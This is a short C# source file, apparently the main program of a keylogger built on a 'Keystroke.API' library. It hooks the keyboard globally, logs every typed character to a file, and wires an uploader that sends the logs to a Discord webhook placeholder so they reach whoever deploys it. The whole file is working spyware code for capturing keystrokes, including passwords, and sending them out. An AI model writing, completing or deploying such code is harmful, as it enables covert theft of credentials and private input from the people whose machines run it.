using Keystroke.API;
using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Keystroke.API.CallbackObjects;
using Keystroke.API.Helpers;

namespace ConsoleApplicationTest
{
	class Program
	{
		static void Main(string[] args)
		{
			// Create Loggin Save Request (1)
			LoggerSaver log = new LoggerSaver();
			// Create your discord url webhook (3)
			LoggerUploader LogUpload = new LoggerUploader("Discord URL WEBHOOK");
			// Subscribe to the event to upload the logs and send them to you (4)
			log.UserTyping += LogUpload.OnUserTyping;
			
			using (var api = new KeystrokeAPI())
			{
				api.CreateKeyboardHook((character) =>
				{
					Console.Write(character);
					// Start saving keystroke (2)
					log.LogDataToFile(character);
				});
				
				Application.Run();
			}
		}
	}
}
